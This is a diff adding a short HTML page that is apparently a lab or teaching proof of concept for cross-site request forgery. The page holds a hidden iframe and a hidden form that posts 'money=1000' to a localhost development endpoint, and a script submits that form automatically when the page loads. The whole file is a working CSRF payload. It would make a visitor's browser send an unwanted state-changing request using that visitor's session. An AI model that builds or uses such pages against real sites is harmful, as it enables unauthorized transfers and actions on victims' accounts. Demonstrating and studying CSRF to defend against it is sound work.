@@ -1,0 +1,15 @@
+<html>
+
+<head>
+</head>
+
+<body>
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form method="post" action="https://5000.dev.localhost/post" target="csrf-frame" id="csrf-form">
+        <input type="hidden" name="money" value="1000">
+        <!-- <input type='submit' value='submit'> -->
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+
+</html>
